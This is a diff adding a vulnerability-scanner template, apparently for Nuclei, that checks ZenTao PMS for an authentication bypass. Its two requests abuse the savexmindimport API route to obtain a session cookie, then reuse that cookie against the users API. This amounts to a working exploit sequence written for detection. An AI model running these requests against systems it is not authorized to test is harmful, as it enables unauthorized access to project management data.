@@ -1,0 +1,48 @@
+id: zentao-pms-auth-bypass
+info:
+  name: ZenTao PMS Authentication Bypass
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: auth-bypass, zentao
+variables:
+  t1: "{{rand_text_alphanumeric(8)}}"
+  t2: "{{rand_text_alphanumeric(8)}}"
+flow: http(1) && http(2)
+http:
+  - id: request-1
+    method: GET
+    path:
+      - "{{BaseURL}}/zentao/api.php?m=testcase&f=savexmindimport&HTTP_X_REQUESTED_WITH=XMLHttpRequest&productID={{t1}}&branch={{t2}}"
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: zentaosid
+        internal: true
+        group: 1
+        regex:
+          - "zentaosid=(.*?);"
+
+  - id: request-2
+    method: GET
+    path:
+      - "{{BaseURL}}/api.php/v1/users"
+    headers:
+      Cookie: "zentaosid={{zentaosid}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 400
+      - type: word
+        part: body
+        words:
+          - "error"
+          - "no company-browse priv"
+      - type: word
+        part: header
+        words:
+          - "application/json"
